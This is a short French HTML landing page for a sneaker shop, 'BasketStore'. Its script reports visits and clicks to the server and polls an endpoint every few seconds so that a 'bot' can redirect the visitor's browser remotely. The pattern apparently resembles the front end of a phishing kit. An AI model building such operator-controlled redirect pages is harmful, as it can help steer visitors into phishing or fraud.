<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Accueil - BasketStore</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
      text-align: center;
      padding: 60px 20px;
    }
    h1 { color: #222; }
    p { color: #444; font-size: 1.2em; }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 15px 25px;
      font-size: 1.1em;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover { background-color: #0056b3; }
  </style>
</head>
<body>
  <h1>üëü Bienvenue sur BasketStore</h1>
  <p>D√©couvrez nos nouvelles paires exclusives.</p>
  <button id="seeProduct">Voir produit</button>

  <script>
    // üîî Notification visite
    window.onload = async () => {
      try { await fetch('/api/visit'); } 
      catch (e) { console.warn('Erreur visite', e); }
    };

    // üéØ Interaction "Voir produit"
    document.getElementById('seeProduct').addEventListener('click', async () => {
      try {
        await fetch('/api/interaction', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
        });
      } catch (e) { console.warn('Erreur interaction', e); }

      window.location.href = '/product.html';
    });

    // üîÅ V√©rifie redirection depuis bot
    let checking = false, lastRedirect = null;
    async function checkStatus() {
      if (checking) return;
      checking = true;
      try {
        const res = await fetch('/api/status', { cache: 'no-store' });
        const data = await res.json();
        if (data.redirect && data.redirect !== lastRedirect) {
          lastRedirect = data.redirect;
          window.location.href = data.redirect;
          return;
        }
      } catch {}
      finally {
        checking = false;
        setTimeout(checkStatus, 2500);
      }
    }
    checkStatus();
  </script>
</body>
</html>
